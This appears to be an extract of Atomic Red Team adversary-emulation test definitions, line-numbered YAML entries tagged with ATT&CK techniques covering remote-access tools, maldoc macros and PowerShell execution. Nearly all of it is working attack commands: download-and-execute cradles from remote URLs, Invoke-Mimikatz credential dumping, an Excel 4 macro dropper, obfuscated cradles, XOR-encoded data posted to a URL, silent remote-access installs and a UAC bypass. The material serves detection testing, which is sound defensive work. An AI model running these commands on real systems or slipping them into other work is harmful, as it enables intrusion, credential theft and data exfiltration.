6485: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [      Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"]
6486: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [      $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"]
6487: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [      Start-Process $file1 /S;]
6488: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [    cleanup_command: ]
6489: [- name: GoToAssist Files Detected Test on Windows] [attack_technique: T1219] [      try{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}]
6492: [- name: ScreenConnect Application Download and Install on Windows] [attack_technique: T1219] [    command: |]
6493: [- name: ScreenConnect Application Download and Install on Windows] [attack_technique: T1219] [      $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"]
6494: [- name: ScreenConnect Application Download and Install on Windows] [attack_technique: T1219] [      Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"]
6495: [- name: ScreenConnect Application Download and Install on Windows] [attack_technique: T1219] [      msiexec /i $installer /qn]
6501: [- name: Ammyy Admin Software Execution] [attack_technique: T1219] [    command: |]
6502: [- name: Ammyy Admin Software Execution] [attack_technique: T1219] [      Start-Process #{Ammyy_Admin_Path}]
6507: [- name: RemotePC Software Execution] [attack_technique: T1219] [    command: |]
6508: [- name: RemotePC Software Execution] [attack_technique: T1219] [      Start-Process #{RemotePC_Path}]
6522: [- name: XOR Encoded data.] [attack_technique: T1132.001] [    command: |]
6523: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      $plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))]
6524: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      $key = "#{key}"]
6525: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      $cyphertext =  @();]
6526: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      for ($i = 0; $i -lt $plaintext.Count; $i++) {]
6527: [- name: XOR Encoded data.] [attack_technique: T1132.001] [       $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];]
6528: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      }]
6529: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)]
6530: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      [System.Net.ServicePointManager]::Expect100Continue = $false]
6531: [- name: XOR Encoded data.] [attack_technique: T1132.001] [      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive]
6534: [- name: Malicious User Agents - Powershell] [attack_technique: T1071.001] [    command: |]
6535: [- name: Malicious User Agents - Powershell] [attack_technique: T1071.001] [      Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null]
6536: [- name: Malicious User Agents - Powershell] [attack_technique: T1071.001] [      Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null]
6537: [- name: Malicious User Agents - Powershell] [attack_technique: T1071.001] [      Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null]
6538: [- name: Malicious User Agents - Powershell] [attack_technique: T1071.001] [      Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null]
6541: [- name: Malicious User Agents - CMD] [attack_technique: T1071.001] [    command: |]
6542: [- name: Malicious User Agents - CMD] [attack_technique: T1071.001] [      #{curl_path} -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1]
6543: [- name: Malicious User Agents - CMD] [attack_technique: T1071.001] [      #{curl_path} -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1]
6544: [- name: Malicious User Agents - CMD] [attack_technique: T1071.001] [      #{curl_path} -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1]
6545: [- name: Malicious User Agents - CMD] [attack_technique: T1071.001] [      #{curl_path} -s -A "*<|>*" -m3 #{domain} >nul 2>&1]
6548: [- name: Execute PowerShell script via Word DDE] [attack_technique: T1559.002] [    command: |]
6549: [- name: Execute PowerShell script via Word DDE] [attack_technique: T1559.002] [      start $PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx]
6552: [- name: OSTap Style Macro Execution] [attack_technique: T1204.002] [    command: |]
6553: [- name: OSTap Style Macro Execution] [attack_technique: T1204.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6554: [- name: OSTap Style Macro Execution] [attack_technique: T1204.002] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6555: [- name: OSTap Style Macro Execution] [attack_technique: T1204.002] [      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"]
6556: [- name: OSTap Style Macro Execution] [attack_technique: T1204.002] [      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"]
6561: [- name: OSTap Payload Download] [attack_technique: T1204.002] [    command: |]
6562: [- name: OSTap Payload Download] [attack_technique: T1204.002] [      echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}]
6563: [- name: OSTap Payload Download] [attack_technique: T1204.002] [      cscript //E:Jscript #{script_file}]
6568: [- name: Maldoc choice flags command execution] [attack_technique: T1204.002] [    command: |]
6569: [- name: Maldoc choice flags command execution] [attack_technique: T1204.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6570: [- name: Maldoc choice flags command execution] [attack_technique: T1204.002] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6571: [- name: Maldoc choice flags command execution] [attack_technique: T1204.002] [      $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"]
6572: [- name: Maldoc choice flags command execution] [attack_technique: T1204.002] [      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"]
6575: [- name: OSTAP JS version] [attack_technique: T1204.002] [    command: |]
6576: [- name: OSTAP JS version] [attack_technique: T1204.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6577: [- name: OSTAP JS version] [attack_technique: T1204.002] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6578: [- name: OSTAP JS version] [attack_technique: T1204.002] [      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"]
6579: [- name: OSTAP JS version] [attack_technique: T1204.002] [      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"]
6582: [- name: Office launching .bat file from AppData] [attack_technique: T1204.002] [    command: |]
6583: [- name: Office launching .bat file from AppData] [attack_technique: T1204.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6584: [- name: Office launching .bat file from AppData] [attack_technique: T1204.002] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6585: [- name: Office launching .bat file from AppData] [attack_technique: T1204.002] [      $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"]
6586: [- name: Office launching .bat file from AppData] [attack_technique: T1204.002] [      Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}]
6589: [- name: Excel 4 Macro] [attack_technique: T1204.002] [    command: |]
6590: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"]
6591: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $fname1 = "$env:TEMP\procexp.exe"]
6592: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      if (Test-Path $fname) {]
6593: [- name: Excel 4 Macro] [attack_technique: T1204.002] [        Remove-Item $fname]
6594: [- name: Excel 4 Macro] [attack_technique: T1204.002] [        Remove-Item $fname1]
6595: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      }]
6596: [- name: Excel 4 Macro] [attack_technique: T1204.002] []
6597: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlApp = New-Object -COMObject "Excel.Application"]
6598: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlApp.Visible = $True]
6599: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlApp.DisplayAlerts = $False]
6600: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlBook = $xlApp.Workbooks.Add()]
6601: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet = $xlBook.Excel4MacroSheets.Add()]
6602: [- name: Excel 4 Macro] [attack_technique: T1204.002] []
6603: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      if ("#{uname}" -ne "") {]
6604: [- name: Excel 4 Macro] [attack_technique: T1204.002] [        $sheet.Cells.Item(1,1) = "#{uname}"]
6605: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      } else {]
6606: [- name: Excel 4 Macro] [attack_technique: T1204.002] [        $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"]
6607: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      }]
6608: [- name: Excel 4 Macro] [attack_technique: T1204.002] []
6609: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(2,1) = "procexp.exe"]
6610: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"]
6611: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"]
6612: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"]
6613: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"]
6614: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"]
6615: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"]
6616: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"]
6617: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"]
6618: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"]
6619: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"]
6620: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"]
6621: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"]
6622: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"]
6623: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"]
6624: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"]
6625: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"]
6626: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"]
6627: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"]
6628: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"]
6629: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"]
6630: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(23,1) = "=HALT()"]
6631: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $sheet.Cells.Item(1,1).Name = "runme"]
6632: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlApp.Run("runme")]
6633: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      $xlApp.Quit()]
6634: [- name: Excel 4 Macro] [attack_technique: T1204.002] []
6635: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null]
6636: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null]
6637: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      [System.GC]::Collect()]
6638: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      [System.GC]::WaitForPendingFinalizers()]
6639: [- name: Excel 4 Macro] [attack_technique: T1204.002] []
6640: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      Remove-Variable xlBook]
6641: [- name: Excel 4 Macro] [attack_technique: T1204.002] [      Remove-Variable xlApp]
6648: [- name: Headless Chrome code execution via VBA] [attack_technique: T1204.002] [    command: |]
6649: [- name: Headless Chrome code execution via VBA] [attack_technique: T1204.002] [        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6650: [- name: Headless Chrome code execution via VBA] [attack_technique: T1204.002] [        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6651: [- name: Headless Chrome code execution via VBA] [attack_technique: T1204.002] [        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"]
6654: [- name: Office Generic Payload Download] [attack_technique: T1204.002] [    command: |]
6655: [- name: Office Generic Payload Download] [attack_technique: T1204.002] [      Invoke-WebRequest #{pua_url} -OutFile #{pua_file}]
6656: [- name: Office Generic Payload Download] [attack_technique: T1204.002] [      & "#{pua_file}"]
6714: [- name: LNK Payload Download] [attack_technique: T1204.002] [    command: |]
6715: [- name: LNK Payload Download] [attack_technique: T1204.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
6716: [- name: LNK Payload Download] [attack_technique: T1204.002] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
6717: [- name: LNK Payload Download] [attack_technique: T1204.002] [      $macroCode = Get-Content "#{macro_path}" -Raw]
6718: [- name: LNK Payload Download] [attack_technique: T1204.002] [      $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"]
6719: [- name: LNK Payload Download] [attack_technique: T1204.002] [      $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"]
6720: [- name: LNK Payload Download] [attack_technique: T1204.002] [      Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"]
6726: [- name: LNK Payload Download] [attack_technique: T1204.002] [    command: |]
6727: [- name: LNK Payload Download] [attack_technique: T1204.002] [      Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"]
6728: [- name: LNK Payload Download] [attack_technique: T1204.002] [      $file1 = "$env:Temp\test10.lnk"]
6729: [- name: LNK Payload Download] [attack_technique: T1204.002] [      Start-Process $file1]
6730: [- name: LNK Payload Download] [attack_technique: T1204.002] [      Start-Sleep -s 10]
6731: [- name: LNK Payload Download] [attack_technique: T1204.002] [      taskkill /IM a.exe /F]
6739: [- name: Execution through API - CreateProcess] [attack_technique: T1106] [    command: |]
6740: [- name: Execution through API - CreateProcess] [attack_technique: T1106] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}]
6741: [- name: Execution through API - CreateProcess] [attack_technique: T1106] [      %tmp%/T1106.exe]
6756: [- name: Mimikatz] [attack_technique: T1059.001] [    command: |]
6757: [- name: Mimikatz] [attack_technique: T1059.001] [      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"]
6760: [- name: Run BloodHound from local disk] [attack_technique: T1059.001] [    command: |]
6761: [- name: Run BloodHound from local disk] [attack_technique: T1059.001] [      write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan]
6762: [- name: Run BloodHound from local disk] [attack_technique: T1059.001] [      import-module #{file_path}\SharpHound.ps1]
6763: [- name: Run BloodHound from local disk] [attack_technique: T1059.001] [      Invoke-BloodHound -OutputDirectory $env:Temp]
6764: [- name: Run BloodHound from local disk] [attack_technique: T1059.001] [      Start-Sleep 5]
6769: [- name: Run Bloodhound from Memory using Download Cradle] [attack_technique: T1059.001] [    command: |]
6770: [- name: Run Bloodhound from Memory using Download Cradle] [attack_technique: T1059.001] [      write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan]
6771: [- name: Run Bloodhound from Memory using Download Cradle] [attack_technique: T1059.001] [      IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');]
6772: [- name: Run Bloodhound from Memory using Download Cradle] [attack_technique: T1059.001] [      Invoke-BloodHound -OutputDirectory $env:Temp]
6773: [- name: Run Bloodhound from Memory using Download Cradle] [attack_technique: T1059.001] [      Start-Sleep 5]
6778: [- name: Obfuscation Tests] [attack_technique: T1059.001] [    command: |]
6779: [- name: Obfuscation Tests] [attack_technique: T1059.001] [      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))]
6780: [- name: Obfuscation Tests] [attack_technique: T1059.001] [      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()]
6781: [- name: Obfuscation Tests] [attack_technique: T1059.001] [      Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))]
6784: [- name: Mimikatz - Cradlecraft PsSendKeys] [attack_technique: T1059.001] [    command: |]
6785: [- name: Mimikatz - Cradlecraft PsSendKeys] [attack_technique: T1059.001] [      $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr]
6788: [- name: Invoke-AppPathBypass] [attack_technique: T1059.001] [    command: |]
6789: [- name: Invoke-AppPathBypass] [attack_technique: T1059.001] [      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"]
6792: [- name: Powershell MsXml COM object - with prompt] [attack_technique: T1059.001] [    command: |]
6793: [- name: Powershell MsXml COM object - with prompt] [attack_technique: T1059.001] [      powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"]
6796: [- name: Powershell XML requests] [attack_technique: T1059.001] [    command: |]
6797: [- name: Powershell XML requests] [attack_technique: T1059.001] [      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"]
6800: [- name: Powershell invoke mshta.exe download] [attack_technique: T1059.001] [    command: |]
6801: [- name: Powershell invoke mshta.exe download] [attack_technique: T1059.001] [      C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"]
6804: [- name: PowerShell Fileless Script Execution] [attack_technique: T1059.001] [    command: |]
6805: [- name: PowerShell Fileless Script Execution] [attack_technique: T1059.001] [      # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""]
6806: [- name: PowerShell Fileless Script Execution] [attack_technique: T1059.001] [      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="]
6807: [- name: PowerShell Fileless Script Execution] [attack_technique: T1059.001] [      iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))]
6813: [- name: PowerShell Downgrade Attack] [attack_technique: T1059.001] [    command: |]
6814: [- name: PowerShell Downgrade Attack] [attack_technique: T1059.001] [      powershell.exe -version 2 -Command Write-Host $PSVersion]
6817: [- name: PowerShell Session Creation and Use] [attack_technique: T1059.001] [    command: |]
6818: [- name: PowerShell Session Creation and Use] [attack_technique: T1059.001] [      Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand']
6819: [- name: PowerShell Session Creation and Use] [attack_technique: T1059.001] [      $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand']
6820: [- name: PowerShell Session Creation and Use] [attack_technique: T1059.001] [      Invoke-Expression $streamcommand]
6853: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    command: |]
6854: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      New-PSSession -ComputerName #{hostname_to_connect}]
6855: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      Test-Connection $env:COMPUTERNAME]
6856: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"]
6857: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use]
6858: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use]
6859: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] []
6860: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  auto_generated_guid: 686a9785-f99b-41d4-90df-66ed515f81d7]
6861: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  - windows]
6862: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  input_arguments:]
6863: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    command_line_switch_type:]
6864: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      type: String]
6865: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      default: Hyphen]
6866: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    command_param_variation:]
6867: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      type: String]
6868: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      default: C]
6869: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  dependencies:]
6870: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.]
6871: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [    prereq_command: |-]
6872: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable]
6873: [- name: ATHPowerShellCommandLineParameter -Command parameter variations] [attack_technique: T1059.001] [      if (-not $RequiredModule) {exit 1}]
